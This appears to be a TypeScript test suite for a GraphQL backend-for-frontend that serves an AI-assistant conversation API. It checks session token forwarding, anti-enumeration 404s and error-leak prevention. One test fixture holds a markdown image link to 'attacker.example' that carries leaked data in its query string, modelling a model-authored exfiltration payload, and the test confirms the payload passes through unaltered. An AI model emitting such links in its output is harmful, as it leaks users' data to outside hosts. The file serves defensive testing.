import type { INestApplication } from '@nestjs/common';
import { ACCESS_COOKIE } from '../src/cookies';
import { bffError } from '../src/identity-client';
import {
  CONVERSATION,
  FakeAssistantClient,
  TOKENS,
  TRANSCRIPT,
  TURN,
  gql,
  gqlBody,
  makeApp,
} from './helpers';

/**
 * The conversation resolvers (M11). What is pinned here is the token flow and
 * the ERROR TAXONOMY — the data mapping is incidental to both.
 *
 * The taxonomy matters because two downstream refusals mean opposite things to
 * a user. A uniform 404 is an ANTI-ENUMERATION control (the service answers the
 * same for "no such conversation" and "someone else's"), so it must stay
 * uniform here rather than being translated into something more helpful. A 403
 * `assistant_disabled` is the master switch being off, which the user can fix,
 * so it must NOT be flattened into a generic failure.
 */

const COOKIE = `${ACCESS_COOKIE}=${encodeURIComponent(TOKENS.accessToken)}`;

const LIST_QUERY = 'query Conversations { conversations { conversationId createdAt updatedAt } }';
const TRANSCRIPT_QUERY = `query Conversation($conversationId: ID!) {
  conversation(conversationId: $conversationId) {
    conversationId
    messages { messageId seq role text createdAt }
  }
}`;
const START_MUTATION = 'mutation StartConversation { startConversation { conversationId } }';
const SEND_MUTATION = `mutation SendMessage($conversationId: ID!, $text: String!) {
  sendMessage(conversationId: $conversationId, text: $text) { conversationId messageId text toolCalls }
}`;
const DELETE_MUTATION =
  'mutation DeleteConversation($conversationId: ID!) { deleteConversation(conversationId: $conversationId) { ok } }';

describe('the conversation surface forwards the caller’s own bearer', () => {
  let app: INestApplication;
  let assistant: FakeAssistantClient;

  beforeEach(async () => {
    assistant = new FakeAssistantClient();
    app = await makeApp({ assistant });
  });

  afterEach(async () => {
    await app.close();
  });

  it('reads, starts, sends and deletes on the exact cookie value', async () => {
    const id = CONVERSATION.conversationId;
    await gql(app, { query: LIST_QUERY }, { cookie: COOKIE });
    await gql(
      app,
      { query: TRANSCRIPT_QUERY, variables: { conversationId: id } },
      { cookie: COOKIE },
    );
    await gql(app, { query: START_MUTATION }, { cookie: COOKIE });
    await gql(
      app,
      { query: SEND_MUTATION, variables: { conversationId: id, text: 'hello' } },
      { cookie: COOKIE },
    );
    await gql(
      app,
      { query: DELETE_MUTATION, variables: { conversationId: id } },
      { cookie: COOKIE },
    );

    // One session's authority for the whole surface — the BFF mints nothing.
    expect(assistant.conversationsCalls).toEqual([TOKENS.accessToken]);
    expect(assistant.transcriptCalls).toEqual([
      { accessToken: TOKENS.accessToken, conversationId: id },
    ]);
    expect(assistant.startCalls).toEqual([TOKENS.accessToken]);
    expect(assistant.sendCalls).toEqual([
      { accessToken: TOKENS.accessToken, conversationId: id, text: 'hello' },
    ]);
    expect(assistant.deleteCalls).toEqual([
      { accessToken: TOKENS.accessToken, conversationId: id },
    ]);
  });

  it.each([
    ['conversations', { query: LIST_QUERY }],
    ['conversation', { query: TRANSCRIPT_QUERY, variables: { conversationId: 'x' } }],
    ['startConversation', { query: START_MUTATION }],
    ['sendMessage', { query: SEND_MUTATION, variables: { conversationId: 'x', text: 'hi' } }],
    ['deleteConversation', { query: DELETE_MUTATION, variables: { conversationId: 'x' } }],
  ])('refuses %s without a session, before reaching the assistant', async (_name, body) => {
    const res = await gql(app, body);
    expect(gqlBody(res).errors?.[0]?.extensions?.['code']).toBe('UNAUTHENTICATED');
    expect(assistant.conversationsCalls).toEqual([]);
    expect(assistant.sendCalls).toEqual([]);
    expect(assistant.deleteCalls).toEqual([]);
  });
});

describe('transcripts cross as data, never as markup', () => {
  let app: INestApplication;

  beforeEach(async () => {
    app = await makeApp({ assistant: new FakeAssistantClient() });
  });

  afterEach(async () => {
    await app.close();
  });

  it('passes a model-authored exfiltration payload through verbatim', async () => {
    // The BFF neither renders nor sanitizes: it carries the bytes, and the web
    // app's MessageText is what makes them harmless (docs/03 §6d). Asserting
    // the payload survives INTACT is what proves nothing here is quietly
    // "cleaning" text and giving a later renderer a false sense of safety.
    const res = await gql(
      app,
      { query: TRANSCRIPT_QUERY, variables: { conversationId: CONVERSATION.conversationId } },
      { cookie: COOKIE },
    );
    const transcript = gqlBody(res).data?.['conversation'] as { messages: Array<{ text: string }> };
    expect(transcript.messages[1]?.text).toBe(TRANSCRIPT.messages[1]?.text);
    expect(transcript.messages[1]?.text).toContain('![](https://attacker.example/?d=leak)');
  });

  it('returns the turn’s reply and its retrieval count', async () => {
    const res = await gql(
      app,
      {
        query: SEND_MUTATION,
        variables: { conversationId: CONVERSATION.conversationId, text: 'hello' },
      },
      { cookie: COOKIE },
    );
    expect(gqlBody(res).data?.['sendMessage']).toEqual({
      conversationId: TURN.conversationId,
      messageId: TURN.messageId,
      text: TURN.text,
      toolCalls: TURN.toolCalls,
    });
  });
});

describe('the two refusals that mean opposite things', () => {
  let app: INestApplication;
  let assistant: FakeAssistantClient;

  beforeEach(async () => {
    assistant = new FakeAssistantClient();
    app = await makeApp({ assistant });
  });

  afterEach(async () => {
    await app.close();
  });

  it('keeps the uniform not-found uniform', async () => {
    // The service answers the same 404 for "no such conversation" and "someone
    // else's conversation" so an id cannot be probed for whether a user has the
    // assistant. Anything richer here rebuilds the oracle it avoided.
    assistant.conversationError = bffError('NOT_FOUND');
    const res = await gql(
      app,
      { query: TRANSCRIPT_QUERY, variables: { conversationId: CONVERSATION.conversationId } },
      { cookie: COOKIE },
    );
    expect(gqlBody(res).errors?.[0]?.extensions?.['code']).toBe('NOT_FOUND');
    expect(JSON.stringify(gqlBody(res).errors)).not.toMatch(/owner|another user|belongs/i);
  });

  it('surfaces the master switch being off as its own code', async () => {
    // Actionable in a way a generic failure is not: the user can turn it on.
    assistant.conversationError = bffError('ASSISTANT_DISABLED');
    const res = await gql(
      app,
      {
        query: SEND_MUTATION,
        variables: { conversationId: CONVERSATION.conversationId, text: 'hello' },
      },
      { cookie: COOKIE },
    );
    expect(gqlBody(res).errors?.[0]?.extensions?.['code']).toBe('ASSISTANT_DISABLED');
  });

  it('never leaks downstream text when a turn fails', async () => {
    const secret = 'anthropic said: rate limit for org_12345';
    assistant.conversationError = new Error(secret);
    const res = await gql(
      app,
      {
        query: SEND_MUTATION,
        variables: { conversationId: CONVERSATION.conversationId, text: 'hello' },
      },
      { cookie: COOKIE },
    );
    expect(JSON.stringify(gqlBody(res))).not.toContain(secret);
    expect(JSON.stringify(gqlBody(res))).not.toContain('org_12345');
  });
});
